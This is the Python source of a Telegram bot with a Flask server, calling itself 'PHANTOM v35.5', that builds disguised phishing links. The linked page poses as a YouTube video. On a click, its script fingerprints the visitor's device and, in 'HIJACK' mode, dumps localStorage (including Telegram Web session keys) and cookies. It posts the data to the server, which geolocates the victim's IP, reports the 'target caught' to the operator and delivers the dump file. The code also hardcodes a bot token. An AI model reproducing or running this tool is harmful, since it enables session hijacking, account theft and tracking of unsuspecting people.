import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

vault = {}
user_settings = {}

# --- [2] ТЕМПЛЕЙТ С ГЛУБОКИМ СБОРОМ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
        .play-btn { position: absolute; top:50%; left:50%; transform:translate(-50%,-50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; position:absolute; top:50%; left:55%; transform:translate(-50%,-50%); border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div style="padding:10px; border-bottom:1px solid #eee;"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%;">
        <div class="play-btn"></div>
    </div>
<script>
let active = false;

async function getStats() {
    let s = {
        ua: navigator.userAgent,
        plat: navigator.platform,
        mem: navigator.deviceMemory || "N/A",
        cpu: navigator.hardwareConcurrency || "N/A",
        lang: navigator.language,
        res: screen.width + "x" + screen.height,
        touch: navigator.maxTouchPoints > 0
    };
    try {
        let b = await navigator.getBattery();
        s.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
        let gl = document.createElement('canvas').getContext('webgl');
        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
        s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    } catch(e) {}
    return s;
}

async function dumpStorage() {
    let s = { local: {}, session: {}, has_tg: false };
    try {
        for (let i = 0; i < localStorage.length; i++) {
            let k = localStorage.key(i);
            if (k.includes('tg') || k.includes('user_auth')) s.has_tg = true;
            s.local[k] = localStorage.getItem(k);
        }
        s.cookies = document.cookie || "None";
    } catch(e) {}
    return s;
}

async function ignite() {
    if(active) return; active = true;
    
    let stats = await getStats();
    let d = { aid: "{{ aid }}", stats: stats };

    if ("{{ mode }}" === "HIJACK") {
        d.storage = await dumpStorage();
    }

    fetch('/log', { 
        method: 'POST', 
        body: btoa(encodeURIComponent(JSON.stringify(d))),
        keepalive: true 
    });
    
    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
}
</script>
</body>
</html>
"""

# --- [3] СЕРВЕРНАЯ ЛОГИКА ---

@app.route('/')
def health(): return "PHANTOM_ALIVE", 200

@app.route('/v/<aid>')
def view(aid):
    mode = user_settings.get(str(aid), "ANALYTICS")
    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)

@app.route('/log', methods=['POST'])
def logger():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        data = json.loads(urllib.parse.unquote(raw))
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        
        # Расширенное ГЕО
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,mobile,proxy,timezone").json()
        
        tid = "SES-" + str(uuid.uuid4())[:8].upper()
        vault[tid] = data
        
        st = data['stats']
        is_hijack = "storage" in data
        has_tg = data.get('storage', {}).get('has_tg', False)

        report = (
            f"🚀 **ЦЕЛЬ ПОЙМАНА | PHANTOM v35.5**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **СЕТЬ И ГЕО**\n"
            f"├ **IP:** `{ip}`\n"
            f"├ **Страна:** `{geo.get('country', 'N/A')}`\n"
            f"├ **Город:** `{geo.get('city', 'N/A')}`\n"
            f"├ **Провайдер:** `{geo.get('isp', 'N/A')}`\n"
            f"└ **Тип:** `{'📱 Mobile' if geo.get('mobile') else '🏠 WiFi/Static'}` | `{'🛡 Proxy/VPN' if geo.get('proxy') else '✅ Clean'}`\n\n"
            
            f"💻 **УСТРОЙСТВО**\n"
            f"├ **ОС:** `{st.get('plat')}`\n"
            f"├ **Экран:** `{st.get('res')}`\n"
            f"├ **Железо:** `{st.get('cpu')} Cores | {st.get('mem')} GB RAM`\n"
            f"├ **Батарея:** `{st.get('bat')}`\n"
            f"└ **GPU:** `{st.get('gpu', 'N/A')[:35]}...`\n\n"
            
            f"📂 **ДАННЫЕ СЕССИИ**\n"
            f"├ **Режим:** `{'🏴‍☠️ HIJACK' if is_hijack else '📊 ANALYTICS'}`\n"
            f"├ **Telegram Web:** `{'✅ ОБНАРУЖЕН' if has_tg else '❌ Не найден'}`\n"
            f"└ **Cookies:** `{'✅ Есть' if st.get('lang') else '❌ Нет'}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 **ID ДАМПА:** `{tid}`\n"
            f"_(Отправь ID боту для получения файла)_"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Fail", 500

# --- [4] БОТ ---

@dp.message(Command("start"))
async def st(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Сгенерировать ссылку").as_markup(resize_keyboard=True)
    await m.answer("🕶 **PHANTOM v35.5 OVERLORD**\nЖду указаний.", reply_markup=kb)

@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def ms(m: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Аналитика (Легкий сбор)", callback_data="m_ANALYTICS")
    kb.button(text="🏴‍☠️ Перехват Сессии (HIJACK)", callback_data="m_HIJACK")
    await m.answer("Выбери режим атаки:", reply_markup=kb.adjust(1).as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def fn(c: types.CallbackQuery):
    mode = c.data.split("_")[1]
    user_settings[str(c.from_user.id)] = mode
    await c.message.edit_text(f"✅ **ССЫЛКА ГОТОВА**\nРежим: `{mode}`\n🔗 `{BASE_URL}/v/{c.from_user.id}`")

@dp.message(F.text.startswith("SES-"))
async def get_dump(m: types.Message):
    tid = m.text.strip().upper()
    if tid in vault:
        dump_str = json.dumps(vault[tid], indent=2, ensure_ascii=False)
        with open(f"{tid}.json", "w", encoding="utf-8") as f:
            f.write(dump_str)
        await m.answer_document(types.FSInputFile(f"{tid}.json"), caption=f"📦 Дамп `{tid}`")
        os.remove(f"{tid}.json")
    else:
        await m.answer("❌ Токен не найден.")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
